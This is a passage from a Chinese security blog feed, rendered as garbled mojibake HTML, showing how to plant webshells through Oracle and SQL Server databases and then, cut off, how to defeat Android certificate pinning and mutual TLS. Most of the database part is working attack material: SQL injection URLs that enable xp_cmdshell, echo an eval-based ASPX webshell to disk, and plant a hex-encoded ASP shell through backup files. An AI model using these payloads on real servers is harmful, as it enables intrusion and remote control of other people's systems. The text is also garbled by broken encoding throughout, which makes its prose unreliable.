class="line">end;</span><br></pre></td></tr></table></figure><p>æ‰§è¡ŒæˆåŠŸ</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/DatabaseWriteWebshell/20.png" alt="image-20200722163418044"></p><p>å¯ä»¥å‘ç°å†™å…¥äº†shell</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/DatabaseWriteWebshell/21.png" alt="image-20200722163501324"></p><p>å¦‚æœæ˜¯çœŸå®ç¯å¢ƒçš„è¯æˆ‘ä»¬å¹¶ä¸èƒ½è¿æ¥æœåŠ¡å™¨ï¼Œè¿™æ ·æˆ‘ä»¬æ€ä¹ˆçŸ¥é“shellæ˜¯å¦å†™å…¥æˆåŠŸå‘¢ï¼Ÿ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">declare</span><br><span class="line">   isto_file utl_file.file_type; --å¦‚ä¸Š</span><br><span class="line">   fp_buffer varchar2(4000); --æ²¡å¿…è¦è¯´äº†å§ï¼Ÿ</span><br><span class="line">begin</span><br><span class="line">   isto_file :&#x3D; utl_file.fopen(&#39;IST0_DIR&#39;, &#39;ascotbe.jsp&#39;, &#39;R&#39;); -- æŒ‡å®šä¸ºè¯»æ“ä½œ</span><br><span class="line">   utl_file.get_line (isto_file , fp_buffer ); --è¯»å–ä¸€è¡Œæ”¾åˆ°  fp_buffer å˜é‡é‡Œé¢</span><br><span class="line">   dbms_output.put_line(fp_buffer);--åœ¨ç»ˆç«¯è¾“å‡ºç»“æœçœ‹çœ‹</span><br><span class="line">   utl_file.fclose(isto_file); --å…³é—­æ–‡ä»¶æŒ‡é’ˆ</span><br><span class="line">end;</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œå³å¯è¯»å–æˆ‘ä»¬å†™å…¥çš„æ–‡ä»¶å†…å®¹äº†</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/DatabaseWriteWebshell/22.png" alt="image-20200722163711282"></p><h2 id="SqlServeræ•°æ®åº“"><a href="#SqlServeræ•°æ®åº“" class="headerlink" title="SqlServeræ•°æ®åº“"></a>SqlServeræ•°æ®åº“</h2><p>é¦–å…ˆæ­å»ºç¯å¢ƒï¼Œå½“å‰ä½¿ç”¨çš„ç¯å¢ƒæ˜¯<strong>SQL Server 2019</strong>ï¼Œå…·ä½“çš„æ­å»ºè‡ªè¡Œç™¾åº¦</p><blockquote><p>æ‹¿shellçš„ä¸¤å¤§å‰æ</p></blockquote><ol><li>æœ‰ç›¸åº”çš„æƒé™db_owner</li><li>çŸ¥é“webç›®å½•çš„ç»å¯¹è·¯å¾„</li></ol><p>æµ‹è¯•çš„æ—¶å€™é»˜è®¤ä½¿ç”¨<strong>sa</strong>è¿›è¡Œè¿æ¥</p><h3 id="å¯»æ‰¾ç»å¯¹è·¯å¾„"><a href="#å¯»æ‰¾ç»å¯¹è·¯å¾„" class="headerlink" title="å¯»æ‰¾ç»å¯¹è·¯å¾„"></a>å¯»æ‰¾ç»å¯¹è·¯å¾„</h3><ul><li><p>æŠ¥é”™ä¿¡æ¯</p></li><li><p>å­—å…¸çŒœ</p></li><li><p>æ—ç«™çš„ç›®å½•</p></li><li><p>å­˜å‚¨è¿‡ç¨‹æ¥æœç´¢</p></li><li><p>è¯»é…ç½®æ–‡ä»¶</p></li></ul><p>å‰ä¸‰ç§æ–¹æ³•éƒ½æ˜¯æ¯”è¾ƒå¸¸è§çš„æ–¹æ³•ã€‚æˆ‘ä»¬ä¸»è¦æ¥è®²ç¬¬å››ç§è°ƒç”¨å­˜å‚¨è¿‡ç¨‹æ¥æœç´¢ã€‚</p><p>åœ¨mssqlä¸­æœ‰ä¸¤ä¸ªå­˜å‚¨è¿‡ç¨‹å¯ä»¥å¸®æˆ‘ä»¬æ¥æ‰¾ç»å¯¹è·¯å¾„ï¼š<code>xp_cmdshell</code>å’Œ <code>xp_dirtree</code></p><h4 id="åˆ©ç”¨xp-dirtreeæ–¹æ³•æ¥å¯»æ‰¾"><a href="#åˆ©ç”¨xp-dirtreeæ–¹æ³•æ¥å¯»æ‰¾" class="headerlink" title="åˆ©ç”¨xp_dirtreeæ–¹æ³•æ¥å¯»æ‰¾"></a>åˆ©ç”¨xp_dirtreeæ–¹æ³•æ¥å¯»æ‰¾</h4><p>å…ˆæ¥çœ‹<code>xp_dirtree</code>ç›´æ¥ä¸¾ä¾‹å­</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">execute master..xp_dirtree &#39;c:&#39; --åˆ—å‡ºæ‰€æœ‰c:\æ–‡ä»¶ã€ç›®å½•ã€å­ç›®å½• </span><br><span class="line">execute master..xp_dirtree &#39;c:&#39;,1 --åªåˆ—c:\ç›®å½•</span><br><span class="line">execute master..xp_dirtree &#39;c:&#39;,1,1 --åˆ—c:\ç›®å½•ã€æ–‡ä»¶</span><br></pre></td></tr></table></figure><p>åˆ—å‡ºæ‰€æœ‰çš„Cç›˜æ–‡ä»¶ã€ç›®å½•ã€å­ç›®å½•</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/DatabaseWriteWebshell/23.png" alt="image-20200723105433198"></p><p>åªåˆ—å‡ºç›®å½•</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/DatabaseWriteWebshell/24.png" alt="image-20200723105502074"></p><p>åˆ—å‡ºæ–‡ä»¶å’Œç›®å½•</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/DatabaseWriteWebshell/25.png" alt="image-20200723105539049"></p><blockquote><p>æ³¨æ„</p></blockquote><p>è¿™è¾¹ä½¿ç”¨<code>xp_dirtree</code>ä¸¾ä¾‹æ‰€åˆ—å‡ºçš„æ–‡ä»¶éƒ½æ˜¯åŸºäºå½“å‰ç›˜ç¬¦å½“å‰ç›®å½•çš„ï¼Œä¸åŒ…æ‹¬ç›®å½•é‡Œé¢çš„æ–‡ä»¶ï¼Œæ¯”å¦‚æˆ‘ä»¬æŸ¥çœ‹Dç›˜å†…å®¹</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/DatabaseWriteWebshell/26.png" alt="image-20200723110109092"></p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/DatabaseWriteWebshell/27.png" alt="image-20200723110137969"></p><p>å¯ä»¥çœ‹åˆ°åªæœ‰ä¸¤ä¸ªæ–‡ä»¶ï¼Œå¯ä»¥è®ºè¯ä¹‹å‰è¯´çš„</p><h5 id="çœŸå®ç¯å¢ƒä¸‹çš„æ“ä½œ"><a href="#çœŸå®ç¯å¢ƒä¸‹çš„æ“ä½œ" class="headerlink" title="çœŸå®ç¯å¢ƒä¸‹çš„æ“ä½œ"></a>çœŸå®ç¯å¢ƒä¸‹çš„æ“ä½œ</h5><p>å½“å®é™…åˆ©ç”¨çš„æ—¶å€™æˆ‘ä»¬å¯ä»¥åˆ›å»ºä¸€ä¸ªä¸´æ—¶è¡¨æŠŠå­˜å‚¨è¿‡ç¨‹æŸ¥è¯¢åˆ°çš„è·¯å¾„æ’å…¥åˆ°ä¸´æ—¶è¡¨ä¸­</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE tmp (dir varchar(8000),num int,num1 int);</span><br><span class="line">insert into tmp(dir,num,num1) execute master..xp_dirtree &#39;c:&#39;,1,1;</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/DatabaseWriteWebshell/28.png" alt="image-20200723110625751"></p><p>ç„¶åæŸ¥è¯¢ä¸‹è¡¨å‘ç°æˆåŠŸå†™å…¥</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/DatabaseWriteWebshell/29.png" alt="image-20200723110801315"></p><h4 id="åˆ©ç”¨xp-cmdshellæ–¹æ³•æ¥å¯»æ‰¾"><a href="#åˆ©ç”¨xp-cmdshellæ–¹æ³•æ¥å¯»æ‰¾" class="headerlink" title="åˆ©ç”¨xp_cmdshellæ–¹æ³•æ¥å¯»æ‰¾"></a>åˆ©ç”¨xp_cmdshellæ–¹æ³•æ¥å¯»æ‰¾</h4><blockquote><p>SQL Server é˜»æ­¢äº†å¯¹ç»„ä»¶ <code>xp_cmdshell</code>çš„è¿‡ç¨‹<strong>sys.xp_cmdshell</strong>çš„è®¿é—®ï¼Œå› ä¸ºæ­¤ç»„ä»¶å·²ä½œä¸ºæ­¤æœåŠ¡å™¨å®‰å…¨é…ç½®çš„ä¸€éƒ¨åˆ†è€Œè¢«å…³é—­ã€‚ç³»ç»Ÿç®¡ç†å‘˜å¯ä»¥é€šè¿‡ä½¿ç”¨ sp_configure å¯ç”¨ã€‚</p></blockquote><p>å¦‚æœé‡åˆ°<code>xp_cmdshell</code>ä¸èƒ½è°ƒç”¨è§£å†³æ–¹æ³•ï¼Œè¿™æ ·æˆ‘ä»¬å°±åªèƒ½èƒ½æ‰§è¡ŒCMDå‘½ä»¤äº†ï¼Œå¼€å¯æ–¹é¢éœ€è¦è¿æ¥æ•°æ®åº“æ‰è¡Œã€‚PS:å¦‚æœéƒ½å¼€å¯è¿™ç§æ–¹æ³•å°±ä¸ç”¨å†™shelläº†ç›´æ¥æ‰§è¡ŒCMDä¸‹è½½æœ¨é©¬å³å¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">;EXEC sp_configure &#39;show advanced options&#39;,1;&#x2F;&#x2F;å…è®¸ä¿®æ”¹é«˜çº§å‚æ•°</span><br><span class="line">RECONFIGURE;</span><br><span class="line">EXEC sp_configure &#39;xp_cmdshell&#39;,1;  &#x2F;&#x2F;æ‰“å¼€xp_cmdshellæ‰©å±•</span><br><span class="line">RECONFIGURE;--</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/DatabaseWriteWebshell/30.png" alt="image-20200723112209434"></p><p>æ¥ä¸‹æ¥æˆ‘ä»¬å…ˆæ¥çœ‹cmdä¸­æ€ä¹ˆæŸ¥æ‰¾æ–‡ä»¶ï¼Œè¯¥æ¡å‘½ä»¤å¦‚æœç”¨powershellä¼šæŠ¥é”™</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for &#x2F;r d:\ %i in (2*.php) do @echo %i</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/DatabaseWriteWebshell/31.png" alt="image-20200723112513645"></p><p>éœ€è¦å»ºç«‹ä¸€ä¸ªè¡¨ å­˜åœ¨ä¸€ä¸ªcharå­—æ®µå°±å¯ä»¥äº†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xx.xx.xx.xx&#x2F;test.aspx?id&#x3D;1;CREATE TABLE cmdtmp (dir varchar(8000));</span><br><span class="line">http:&#x2F;&#x2F;xx.xx.xx.xx&#x2F;test.aspx?id&#x3D;1;insert into cmdtmp(dir) exec master..xp_cmdshell &#39;for &#x2F;r d:\ %i in (2*.php) do @echo %i&#39;</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/DatabaseWriteWebshell/32.png" alt="image-20200723112610911"></p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/DatabaseWriteWebshell/33.png" alt="image-20200723112707616"></p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/DatabaseWriteWebshell/34.png" alt="image-20200723112930188"></p><p>æˆåŠŸæŸ¥è¯¢å‡ºç»“æœ</p><h3 id="å†™å…¥Webshell"><a href="#å†™å…¥Webshell" class="headerlink" title="å†™å…¥Webshell"></a>å†™å…¥Webshell</h3><h4 id="åˆ©ç”¨xp-cmdshellå‘½ä»¤å†™shell"><a href="#åˆ©ç”¨xp-cmdshellå‘½ä»¤å†™shell" class="headerlink" title="åˆ©ç”¨xp_cmdshellå‘½ä»¤å†™shell"></a>åˆ©ç”¨xp_cmdshellå‘½ä»¤å†™shell</h4><p>ä¸Šé¢è¯´äº†xp_cmdshellè¿™ä¸ªå­˜å‚¨è¿‡ç¨‹å¯ä»¥ç”¨æ¥æ‰§è¡Œcmdå‘½ä»¤ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥é€šè¿‡cmdçš„echoå‘½ä»¤æ¥å†™å…¥shellï¼Œå½“ç„¶å‰ææ˜¯ä½ çŸ¥é“webç›®å½•çš„ç»å¯¹è·¯å¾„ï¼Œå¦‚æœä¸å­˜åœ¨è·¯å¾„ä¼šæŠ¥é”™ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xx.xx.xx.xx&#x2F;test.aspx?id&#x3D;1;exec master..xp_cmdshell &#39;echo ^&lt;%@ Page Language&#x3D;&quot;Jscript&quot;%^&gt;^&lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%^&gt; &gt; D:\\test\\ascotbe.aspx&#39; ;</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/DatabaseWriteWebshell/35.png" alt="image-20200723113418645"></p><p>å†™å…¥æˆåŠŸ</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/DatabaseWriteWebshell/36.png" alt="image-20200723113431063"></p><h4 id="å·®å¼‚å¤‡ä»½å†™shell"><a href="#å·®å¼‚å¤‡ä»½å†™shell" class="headerlink" title="å·®å¼‚å¤‡ä»½å†™shell"></a>å·®å¼‚å¤‡ä»½å†™shell</h4><p>å› ä¸ºæƒé™çš„é—®é¢˜ï¼Œæœ€å¥½ä¸è¦å¤‡ä»½åˆ°ç›˜ç¬¦æ ¹ç›®å½•</p><p>å½“è¿‡æ»¤äº†ç‰¹æ®Šçš„å­—ç¬¦æ¯”å¦‚å•å¼•å·ï¼Œæˆ–è€… è·¯å¾„ç¬¦å· éƒ½å¯ä»¥ä½¿ç”¨å®šä¹‰å±€éƒ¨å˜é‡æ¥æ‰§è¡Œã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xx.xx.xx.xx&#x2F;test.aspx?id&#x3D;1;backup database åº“å to disk &#x3D; &#39;D:\bak.bak&#39;;--</span><br><span class="line">http:&#x2F;&#x2F;xx.xx.xx.xx&#x2F;test.aspx?id&#x3D;1;create table [dbo].[test] ([cmd] [image]);</span><br><span class="line">http:&#x2F;&#x2F;xx.xx.xx.xx&#x2F;test.aspx?id&#x3D;1;insert into test(cmd) values(0x3C25657865637574652872657175657374282261222929253E);</span><br><span class="line">http:&#x2F;&#x2F;xx.xx.xx.xx&#x2F;test.aspx?id&#x3D;1;backup database åº“å to disk&#x3D;&#39;D:\ascotbe.asp&#39; WITH DIFFERENTIAL,FORMAT;--</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæµ‹è¯•åªèƒ½è¿›è¡Œå¤‡ä»½ï¼Œæ‰§è¡Œæœ€åä¸€å¥å·®å¼‚å¤‡ä»½ä¼šæŠ¥é”™ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥è¿›è¡Œå¤‡ä»½å†™shellï¼Œè™½ç„¶æ–‡ä»¶ä¼šå¾ˆå¤§</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/DatabaseWriteWebshell/37.png" alt="image-20200723134845565"></p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/DatabaseWriteWebshell/38.png" alt="image-20200723134901581"></p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/DatabaseWriteWebshell/39.png" alt="image-20200723135025252"></p><p>å¯ä»¥çœ‹åˆ°shellæ˜¯å†™è¿›å»äº†ï¼Œå°±æ˜¯æ–‡ä»¶æœ‰ç‚¹å¤§</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/DatabaseWriteWebshell/40.png" alt="image-20200723142516722"></p><h4 id="logå¤‡ä»½å†™shell"><a href="#logå¤‡ä»½å†™shell" class="headerlink" title="logå¤‡ä»½å†™shell"></a>logå¤‡ä»½å†™shell</h4><p>LOGå¤‡ä»½çš„è¦æ±‚æ˜¯ä»–çš„æ•°æ®åº“å¤‡ä»½è¿‡ï¼Œè€Œä¸”é€‰æ‹©æ¢å¤æ¨¡å¼å¾—æ˜¯å®Œæ•´æ¨¡å¼ï¼Œè‡³å°‘åœ¨2008ä¸Šæ˜¯è¿™æ ·çš„ï¼Œä½†æ˜¯ä½¿ç”¨logå¤‡ä»½æ–‡ä»¶ä¼šå°çš„å¤šï¼Œå½“ç„¶å¦‚æœä½ çš„æƒé™å¤Ÿé«˜å¯ä»¥è®¾ç½®ä»–çš„æ¢å¤æ¨¡å¼</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;ä»¥ä¸‹æ­¥éª¤çœç•¥http:&#x2F;&#x2F;xx.xx.xx.xx&#x2F;test.aspx?id&#x3D;1</span><br><span class="line">alter database åº“å set RECOVERY FULL;</span><br><span class="line">create table cmd (a image) ;</span><br><span class="line">backup log åº“å to disk &#x3D; &#39;D:\test&#39; with init ;</span><br><span class="line">insert into cmd (a) values (0x3C25657865637574652872657175657374282261222929253E) ;</span><br><span class="line">backup log åº“å to disk &#x3D; &#39;D:\test\2.asp&#39;;</span><br></pre></td></tr></table></figure><h2 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.cnblogs.com&#x2F;springside-example&#x2F;archive&#x2F;2007&#x2F;09&#x2F;06&#x2F;2529958.html</span><br><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;zyq357&#x2F;article&#x2F;details&#x2F;104698157</span><br><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;junmail&#x2F;article&#x2F;details&#x2F;4381287</span><br><span class="line">https:&#x2F;&#x2F;www.cnblogs.com&#x2F;xuliangxing&#x2F;p&#x2F;6005154.html</span><br><span class="line">https:&#x2F;&#x2F;y4er.com&#x2F;post&#x2F;mssql-getshell&#x2F;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    
  </entry>
  
  <entry>
    <title>è§£å†³å®‰å“å•å‘/åŒå‘è®¤è¯å¯¼è‡´æ— æ³•æŠ“åŒ…</title>
    <link href="https://www.ascotbe.com/2020/07/20/HttpCertificate/"/>
    <id>https://www.ascotbe.com/2020/07/20/HttpCertificate/</id>
    <published>2020-07-20T12:45:53.000Z</published>
    <updated>2021-05-17T00:32:35.016Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>å£°æ˜</p></blockquote><p>éƒ‘é‡å£°æ˜ï¼šæ–‡ä¸­æ‰€æ¶‰åŠçš„æŠ€æœ¯ã€æ€è·¯å’Œå·¥å…·ä»…ä¾›ä»¥å®‰å…¨ä¸ºç›®çš„çš„å­¦ä¹ äº¤æµä½¿ç”¨ï¼Œä»»ä½•äººä¸å¾—å°†å…¶ç”¨äºéæ³•ç”¨é€”ä»¥åŠç›ˆåˆ©ç­‰ç›®çš„ï¼Œå¦åˆ™åæœè‡ªè¡Œæ‰¿æ‹…ï¼</p><blockquote><p>å‰è¨€</p></blockquote><p>æœ¬æ–‡æ€è·¯æ¥ç€å…¬ä¼—å·å°å’Œå°šçš„å®‰å…¨ä¹‹è·¯ï¼Œèœé¸¡çš„æˆ‘å‘¨å¤©é¢è¯•è¢«ç¤¾ä¼šæ¯’æ‰“äº†ä¸€é¡¿ï¼Œé—®äº†åŒå‘è®¤è¯é—®é¢˜ï¼Œä½†æ˜¯è¿™ç©æ„æˆ‘æ²¡æ¥è§¦è¿‡ï¼Œåˆšå¥½ä»Šå¤©çœ‹åˆ°ä¸€ç¯‡æ–‡ç« ï¼Œå­¦ä¹ ä¸€ä¸‹</p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/HttpCertificate/25.png" alt="image-20200720171422600" style="zoom:67%;" /><h3 id="é¦–å…ˆå‡†å¤‡å·¥ä½œ"><a href="#é¦–å…ˆå‡†å¤‡å·¥ä½œ" class="headerlink" title="é¦–å…ˆå‡†å¤‡å·¥ä½œ"></a>é¦–å…ˆå‡†å¤‡å·¥ä½œ</h3><ul><li>XposedInstallerï¼ˆXposedå®‰è£…å™¨ï¼‰</li><li>JustTrustMeï¼ˆç¦ç”¨SSLï¼‰</li><li>ida proï¼ˆé™æ€é€†å‘ç¨‹åºï¼‰</li><li>JEBï¼ˆapkè§£åŒ…ç¨‹åºï¼‰</li><li>test.apkï¼ˆç›®æ ‡ç¨‹åºï¼‰</li></ul><p>æ‰€éœ€æ–‡ä»¶ä½ç½®ä¸‹è½½</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Ascotbe&#x2F;virus&#x2F;blob&#x2F;master&#x2F;HttpCertificate</span><br></pre></td></tr></table></figure><h3 id="è§£å†³å•å‘è®¤è¯"><a href="#è§£å†³å•å‘è®¤è¯" class="headerlink" title="è§£å†³å•å‘è®¤è¯"></a>è§£å†³å•å‘è®¤è¯</h3><h4 id="å®‰è£…Xposedæ¡†æ¶"><a href="#å®‰è£…Xposedæ¡†æ¶" class="headerlink" title="å®‰è£…Xposedæ¡†æ¶"></a>å®‰è£…<strong>Xposed</strong>æ¡†æ¶</h4><p>åˆšå¼€å§‹å®‰è£…å¥½APKæ˜¯æ˜¾ç¤ºæ¡†æ¶æœªå®‰è£…çš„</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/HttpCertificate/1.png" alt="image-20200720112832854"></p><p>ç‚¹å‡»è¿™ä¸ªå®‰è£…</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/HttpCertificate/2.png" alt="image-20200720112859128"></p><p>xuanzå®‰è£…</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/HttpCertificate/3.png" alt="image-20200720112931127"></p><p>æ¥ç€ç‚¹å‡»å®‰è£…</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/HttpCertificate/4.png" alt="image-20200720112330718"></p><p>ç„¶åä»èµ·åå°±èƒ½çœ‹åˆ°å®‰è£…æˆåŠŸäº†</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/HttpCertificate/5.png" alt="image-20200720113013136"></p><h4 id="å®‰è£…JustTrusMeæ¨¡å—"><a href="#å®‰è£…JustTrusMeæ¨¡å—" class="headerlink" title="å®‰è£…JustTrusMeæ¨¡å—"></a>å®‰è£…JustTrusMeæ¨¡å—</h4><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/HttpCertificate/6.png" alt="image-20200720113109696"></p><p>ç‚¹å‡»å·¦ä¸Šè§’çš„èœå•</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/HttpCertificate/7.png" alt="image-20200720113207651"></p><p>ç„¶åé€‰ç€æ¨¡å—</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/HttpCertificate/8.png" alt="image-20200720113235596"></p><p>å‹¾é€‰å°±å¥½äº†ï¼Œè¿™æ ·å°±è§£å†³äº†å•å‘è®¤è¯ï¼Œå¯ä»¥ç»•è¿‡å®¢æˆ·ç«¯æ ¡éªŒäº†</p><h3 id="è§£å†³åŒå‘è®¤è¯"><a href="#è§£å†³åŒå‘è®¤è¯" class="headerlink" title="è§£å†³åŒå‘è®¤è¯"></a>è§£å†³åŒå‘è®¤è¯</h3><p>æˆ‘ä»¬æ¥æŠŠç›®æ ‡ç¨‹åºæŠ“ä¸ªåŒ…</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/HttpCertificate/9.png" alt="image-20200720115020799"></p><p>å¯ä»¥çœ‹åˆ°æœåŠ¡å™¨æ˜¾ç¤ºä¸º400ï¼ŒæŠ“åŒ…æ— æ³•ç”¨äº†</p><h4 id="æ‰¾å®¢æˆ·ç«¯çš„è¯ä¹¦"><a href="#æ‰¾å®¢æˆ·ç«¯çš„è¯ä¹¦" class="headerlink" title="æ‰¾å®¢æˆ·ç«¯çš„è¯ä¹¦"></a>æ‰¾å®¢æˆ·ç«¯çš„è¯ä¹¦</h4><p>æ¥ä¸‹æ¥å°±æ˜¯å®¢æˆ·ç«¯çš„è¯ä¹¦äº†ï¼Œæˆ‘ä»¬å…ˆè§£å‹è¿™ä¸ªè½¯ä»¶</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/HttpCertificate/10.png" alt="image-20200720134216876"></p><p>ç„¶åå…¨å±€æ”¶ç¼©è¿™ä¸ªè½¯ä»¶çš„è¯ä¹¦ä¸€èˆ¬æ˜¯<code>.p12</code>æˆ–è€…<code>.pfx</code>ç»“å°¾çš„ï¼ˆå¦‚æœè¿™ä¸ªç‰ˆæœ¬æœ‰å£³ä½ å«Œéº»çƒ¦ä¸æƒ³è„±å£³çš„è¯å¯ä»¥æ‰¾ä¹‹å‰çš„ç‰ˆæœ¬è¯•è¯•ï¼‰</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/HttpCertificate/11.png" alt="image-20200720135748469"></p><h4 id="æ‰¾è¯ä¹¦å¯†ç "><a href="#æ‰¾è¯ä¹¦å¯†ç " class="headerlink" title="æ‰¾è¯ä¹¦å¯†ç "></a>æ‰¾è¯ä¹¦å¯†ç </h4><p>é¦–å…ˆéœ€è¦è®¾ç½®jebçš„æœ€å¤§å†…å­˜ä¸ç„¶ä¼šæŠ¥é”™ï¼Œå› ä¸ºå¤§çš„APKä¼šå¯¼è‡´javaå†…å­˜æº¢å‡ºï¼Œæ›¿æ¢<strong>jeb_wincon.bat</strong>æ–‡ä»¶ä¸­çš„å†…å®¹ï¼Œ<code>-Xmx8192m</code>è¡¨ç¤ºå†…å­˜çš„å¤§å°</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">%JAVA%</span> -jar &quot;%~dp0bin\app\jebc.jar&quot; %*</span><br><span class="line">//æ›¿æ¢ä¸º</span><br><span class="line"><span class="variable">%JAVA%</span> -Xmx8192m  -XX:-UseParallelGC  -XX:MinHeapFreeRatio=<span class="number">15</span>  -jar &quot;%~dp0bin\app\jebc.jar&quot; %*</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/HttpCertificate/12.png" alt="image-20200720150405689"></p><p>æ‰“å¼€<strong>test.apk</strong>ï¼Œåˆ©ç”¨æœç´¢æ¥æ‰¾<strong>client.p12</strong>çš„å€¼ï¼ˆæˆ–è€…å…³é”®å­—PKCS12ï¼Œè¿™æ˜¯é€šå¸¸è¯»å–è¯ä¹¦éœ€è¦ç”¨åˆ°çš„å…³é”®å­—ï¼‰</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/HttpCertificate/13.png" alt="image-20200720153437104"></p><p>å¯¹å­—ç¬¦ä¸²çš„ä½ç½®è¿›è¡Œå³é”®è§£æ</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/HttpCertificate/14.png" alt="image-20200720153555251"></p><p>å¾€ä¸‹é¢æ‰¾æ‰¾çœ‹æœ‰æ²¡æœ‰ä»€ä¹ˆopenä¹‹ç±»çš„å‡½æ•°æ¥æ‰“å¼€è¯ä¹¦çš„</p><p>è¿™è¾¹å¤§æ¦‚çš„æ„æ€å°±æ˜¯æŠŠæ‰“å¼€çš„è¯ä¹¦å’Œæ•°ç»„ä¸­çš„å­—ç¬¦ä¸²åŠ è½½åˆ°<code>v4_1</code>è¿™ä¸ªå‡½æ•°ä¸­ï¼Œç„¶åè·³è½¬åˆ°<code>label_27</code>ä¸­è¿›è¡Œå…³é—­æ‰“å¼€çš„è¯ä¹¦ï¼Œæ‰€ä»¥ç™¾åˆ†ä¹‹80å¯ä»¥æ–­å®š<code>v1</code>åº”è¯¥å°±æ˜¯æˆ‘ä»¬éœ€è¦çš„å¯†ç </p><p>è·Ÿè¿›<code>v1</code>çš„å€¼ï¼ˆåŒå‡»å³å¯ï¼‰</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/HttpCertificate/15.png" alt="image-20200720154800481"></p><p>è·Ÿè¿›åˆ°è¿™è¾¹å‘ç°è°ƒç”¨äº†å¥½å‡ 